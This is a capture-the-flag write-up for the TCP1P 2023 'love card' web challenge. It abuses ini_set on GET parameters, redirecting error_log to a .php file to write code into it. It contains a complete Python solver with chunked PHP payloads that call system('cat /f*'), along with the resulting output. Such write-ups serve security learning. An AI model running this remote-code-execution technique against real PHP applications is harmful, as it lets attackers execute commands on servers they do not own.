# love card

## Description

> Make your own love card for your gf <3
>
> <http://ctf.tcp1p.com:9137>
>
> Attachment: dist.zip

## Flag

TCP1P{this_is_not_about_love_this_is_about_RCE<3}

## Solution

index.php

```php
foreach ($_GET as $key => $value) {
  ini_set($key, $value);
}
```

It is possible to write a content to a file by using [log_errors](https://www.php.net/manual/en/errorfunc.configuration.php#ini.log-errors) and [error_log](https://www.php.net/manual/en/errorfunc.configuration.php#ini.error-log).

This solution takes a roundabout approach.
When I pass an array in the query string, I get the following error:

```console
root@kali:~/ctf/TCP1PCTF_2023/web/love_card/dist/src# curl 'http://localhost:9137/?log_errors=on&error_log=tmp.php&12345678901234567890[]=b'
<br />
<b>Fatal error</b>:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:6
Stack trace:
#0 /var/www/html/index.php(6): ini_set('123456789012345...', Array)
#1 {main}
  thrown in <b>/var/www/html/index.php</b> on line <b>6</b><br />
```

So adjust the parameters so that the executable PHP code is placed in the array name (in the above `123456789012345`).

solver.py

```python
from urllib.parse import quote
import requests
import uuid

# BASE_URL = "http://localhost:9137"
BASE_URL = "http://ctf.tcp1p.com:9137"

payloads = """
<?=1;/*
*/$a="cat"/*
*/;/*
*/$a="$a\t"/*
*/;/*
*/$a="$a/f*"/*
*/;/*
*/system($a)/*
*/;/*
*/?>
"""

payloads = payloads.split("\n")

# check length
for payload in payloads:
    try:
        assert len(payload) <= 15
    except AssertionError:
        print("length error")
        print(payload)
        exit(0)

filename = f"{str(uuid.uuid4())}.php"

for payload in payloads:
    resp = requests.get(
        f"{BASE_URL}?log_errors=1&error_log={filename}&{quote(payload)}[]=1"
    )

resp = requests.get(f"{BASE_URL}/{filename}")
print(resp.text)
```

```console
root@kali:~/ctf/TCP1PCTF_2023/web/love_card# python3 solver.py
[16-Oct-2023 05:09:25 UTC] PHP Warning:  Undefined array key "name" in /var/www/html/index.php on line 13
[16-Oct-2023 05:09:25 UTC] PHP Deprecated:  preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated in /var/www/html/index.php on line 13
[16-Oct-2023 05:09:25 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:6
Stack trace:
#0 /var/www/html/index.php(6): ini_set('1TCP1P{this_is_not_about_love_this_is_about_RCE<3}', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 6
[16-Oct-2023 05:09:27 UTC] PHP Warning:  Undefined array key "name" in /var/www/html/index.php on line 13
[16-Oct-2023 05:09:27 UTC] PHP Deprecated:  preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated in /var/www/html/index.php on line 13
```

<details><summary>Test results on localhost</summary>

console output:

```console
root@kali:~/ctf/TCP1PCTF_2023/web/love_card# python3 solver.py
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('1TCP1P{fake_flag}', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
```

randomname.php

```php
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('<?=1;/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/$a="cat"/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/;/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/$a="$a\t"/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/;/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/$a="$a/f*"/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/;/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/system($a)/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/;/*', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
[16-Oct-2023 05:12:15 UTC] PHP Fatal error:  Uncaught TypeError: ini_set(): Argument #2 ($value) must be of type string|int|float|bool|null in /var/www/html/index.php:4
Stack trace:
#0 /var/www/html/index.php(4): ini_set('*/?>', Array)
#1 {main}
  thrown in /var/www/html/index.php on line 4
```

</details>

If I had to say, the strength of this solution is that it can be used even when there is no functionality to output `$_GET['name']` such as:

```php
if (preg_match('/<|>|\?|\*|\||&|;|\'|="/', $_GET["name"])) {
  error_log(
    "Warning: User tried to access with name: " .
      $_GET["name"] .
      ", Only alphanumeric allowed!"
  );
  die("Nope");
}
```

For example, even if index.php is only the following, it is possible to occur RCE.

```php
<?php

foreach ($_GET as $key => $value) {
  ini_set($key, $value);
}
```
